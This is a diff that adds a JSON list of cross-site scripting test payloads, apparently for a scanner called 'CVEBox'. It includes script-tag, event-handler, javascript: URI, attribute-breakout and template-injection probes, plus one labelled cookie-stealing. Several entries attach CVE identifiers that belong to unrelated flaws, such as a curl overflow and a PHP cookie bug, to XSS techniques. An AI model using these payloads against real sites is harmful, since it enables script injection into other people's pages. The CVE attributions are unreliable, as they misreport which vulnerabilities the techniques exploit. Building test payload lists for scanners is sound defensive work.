@@ -1,0 +1,98 @@
+[
+  {
+    "value": "<script>alert('CVEBox-XSS')</script>",
+    "description": "Basic reflected XSS via script tag injection",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "<img src=x onerror=alert('CVEBox-XSS')>",
+    "description": "XSS via img tag onerror event handler - bypasses many script filters",
+    "cveId": "CVE-2023-38545",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38545",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "\"><script>alert('CVEBox-XSS')</script>",
+    "description": "XSS with attribute escape to break out of HTML attribute context",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "javascript:alert('CVEBox-XSS')",
+    "description": "XSS via javascript: URI scheme in href or src attributes",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "medium",
+    "xssType": "dom"
+  },
+  {
+    "value": "<svg onload=alert('CVEBox-XSS')>",
+    "description": "SVG-based XSS using onload event - bypasses HTML-only filters",
+    "cveId": "CVE-2021-26295",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26295",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "<body onload=alert('CVEBox-XSS')>",
+    "description": "XSS via body tag onload event injection",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "'><img src=1 onerror=alert('CVEBox-XSS')>",
+    "description": "XSS with single-quote escape for attribute breakout",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "<iframe src=\"javascript:alert('CVEBox-XSS')\">",
+    "description": "XSS via iframe with javascript: URI",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "high",
+    "xssType": "dom"
+  },
+  {
+    "value": "<details open ontoggle=alert('CVEBox-XSS')>",
+    "description": "HTML5-specific XSS via details ontoggle event - bypasses legacy WAFs",
+    "cveId": "CVE-2022-31629",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31629",
+    "severity": "high",
+    "xssType": "reflected"
+  },
+  {
+    "value": "{{constructor.constructor('alert(1)')()}}",
+    "description": "Angular/Vue template injection leading to XSS via constructor chain",
+    "cveId": "CVE-2023-26116",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26116",
+    "severity": "critical",
+    "xssType": "dom"
+  },
+  {
+    "value": "<script>document.write(document.cookie)</script>",
+    "description": "Cookie-stealing XSS payload to test for stored injection points",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "critical",
+    "xssType": "stored"
+  },
+  {
+    "value": "<input onfocus=alert('CVEBox-XSS') autofocus>",
+    "description": "Auto-triggered XSS via autofocus attribute - no user interaction required",
+    "cveId": "CWE-79",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site+scripting",
+    "severity": "high",
+    "xssType": "stored"
+  }
+]
